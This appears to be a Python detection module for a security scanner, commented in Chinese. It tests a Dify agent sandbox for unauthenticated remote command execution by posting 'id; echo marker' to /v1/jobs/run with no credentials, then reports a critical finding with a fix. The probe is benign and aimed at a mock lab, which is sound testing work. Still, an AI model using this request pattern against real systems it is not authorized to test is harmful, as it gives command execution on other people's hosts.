"""dify-local-sandbox-unauth-rce — Dify 本地沙箱零前置执行（零日级漏洞模块（已公开），零前置最高危）。

检测流程：/__routes__ fingerprint → 无凭据向 /v1/jobs/run 提交良性 marker 命令（id/echo，无破坏性）
→ 200 + SUCCEEDED 即「任意网络邻居零前置命令执行面」；401 → 加固态零发现。
"""
from __future__ import annotations

import json
import urllib.error
import urllib.request

TARGET_SERVICE = "dify-agent"
TARGET_PATH = "/v1/jobs/run"


def _request(method: str, url: str, body=None, headers=None, timeout: int = 15):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw, status = resp.read(), resp.status
    except urllib.error.HTTPError as exc:
        raw, status = exc.read(), exc.code
    text = raw.decode("utf-8", "replace")
    try:
        payload = json.loads(text)
    except ValueError:
        payload = text
    return status, payload


def _fingerprint(base: str):
    status, manifest = _request("GET", base + "/__routes__")
    if status != 200 or not isinstance(manifest, dict):
        return None, "fingerprint 失败：目标无 /__routes__ 清单（非实验室 mock 语义），不进入动作分支"
    for route in manifest.get("routes", []):
        if route.get("service") == TARGET_SERVICE and route.get("path") == TARGET_PATH:
            return manifest, None
    return manifest, f"fingerprint 未命中：目标无 {TARGET_SERVICE} {TARGET_PATH} 路由"


def run(ctx: dict, params: dict) -> dict:
    base = str(params.get("base_url", "")).rstrip("/")
    if not base:
        raise ValueError("缺少 params.base_url（mock 靶场地址，仅限授权范围）")
    marker = str(params.get("marker") or ctx.get("marker") or "INKBLADE-zeroday")

    manifest, miss = _fingerprint(base)
    if miss is not None:
        return {"summary": miss, "findings": [], "artifacts": []}

    script = f"id; echo {marker}"  # 良性探针：身份枚举 + marker 回显，无破坏性动作
    status, payload = _request("POST", base + TARGET_PATH, body={"script": script})
    findings: list[dict] = []
    if status == 200 and isinstance(payload, dict) and payload.get("status") == "SUCCEEDED":
        findings.append({
            "sev": "critical",
            "title": "Dify 本地沙箱零前置执行：任意网络邻居可在沙箱宿主执行命令",
            "detail": "镜像默认无鉴权 + 管理令牌默认空：同网络任意主体零前置（无需任何凭据/租户身份）在沙箱宿主执行任意命令，"
                      "并可枚举/读写全部租户家目录——智能体平台作为训练集群初始立足点的最高危路径。",
            "evidence": json.dumps({
                "route": TARGET_PATH, "status": status, "run_id": payload.get("run_id"),
                "script_path": payload.get("script_path"), "mode": (manifest or {}).get("mode"), "marker": marker,
            }, ensure_ascii=False),
            "mapping": "零日登记册：智能体平台沙箱零前置条目（零前置最高危）；链「智能体平台零前置执行 → 训练集群横向」",
            "fix": "沙箱服务默认开启鉴权且令牌非空；沙箱宿主独立网络域（拒绝任意邻居可达）；家目录按租户隔离 + 审计",
            "is_zeroday": True,
        })
        summary = "fingerprint 命中 dify-agent；无凭据沙箱命令执行面成立（vulnerable 姿态）"
    else:
        summary = f"fingerprint 命中 dify-agent；沙箱作业被拒（status={status}，fixed/加固态）"
    return {"summary": summary, "findings": findings, "artifacts": []}
